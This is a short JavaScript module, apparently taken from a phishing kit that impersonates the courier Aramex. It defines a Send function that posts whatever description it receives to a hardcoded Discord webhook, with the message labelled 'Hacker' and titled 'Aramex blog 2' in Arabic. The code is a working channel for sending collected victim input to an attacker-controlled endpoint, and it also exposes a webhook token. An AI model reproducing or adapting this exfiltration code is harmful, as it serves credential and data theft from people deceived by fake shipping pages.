import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321594480217817190/jyR1HDPa8xX5OGnYmmLWKzh5_-8-QMHBkE2Izrpge_1p4E767pLcVoHR5kOiuJWugjQy",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
